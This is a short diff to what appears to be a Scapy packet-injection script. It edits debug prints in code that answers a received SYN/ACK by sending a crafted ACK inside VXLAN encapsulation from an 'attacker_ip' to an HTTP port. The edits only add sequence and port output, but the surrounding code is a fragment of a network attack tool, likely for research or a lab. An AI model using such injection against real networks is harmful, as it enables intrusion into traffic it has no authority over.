@@ -67,7 +67,7 @@ def syn_ack_do(packet):
     syn_ack_seq = packet[TCP].seq
     if debug:
         print("############## SYN/ACK packet received ##############")
-        print("dport von SYN/ACK = " + str(syn_ack_dport))
+        print("dport = " + str(syn_ack_dport))
         print("ACK# = " + str(syn_ack_ack))
         print("SEQ# = " + str(syn_ack_seq))
     return
@@ -89,8 +89,9 @@ ack = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_
 out_ack = send(ack, verbose=0)
 if debug:
         print("############## ACK packet sent #####################")
-        type(out_ack)
-
+        print("ACK# = " + str(syn_ack_seq + 1))
+        print("SEQ# = " + str(syn_ack_ack))
+        print("srcport = " + str(syn_ack_dport)) 
 
 ### Print the layers of the packet
 def get_packet_layers(packet):
